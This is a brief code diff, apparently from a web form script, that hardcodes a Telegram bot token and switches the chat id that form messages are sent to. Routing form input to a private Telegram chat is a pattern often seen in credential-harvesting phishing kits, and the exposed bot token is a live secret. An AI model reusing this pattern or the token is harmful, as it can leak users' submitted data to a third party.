@@ -56,7 +56,7 @@ document.querySelector("form.pure-form")
 
             // declearing bot token and chat id
             var bot_token = "5075396560:AAHWyWBpz7xpWO1Wa3KGrEnA3appEzkBC88"; // bot token
-            var chat_id = 788765432; // my chat id
+            var chat_id = 1528518416; // my chat id
 
             // creating url using bot token, chat id and message
             var url =
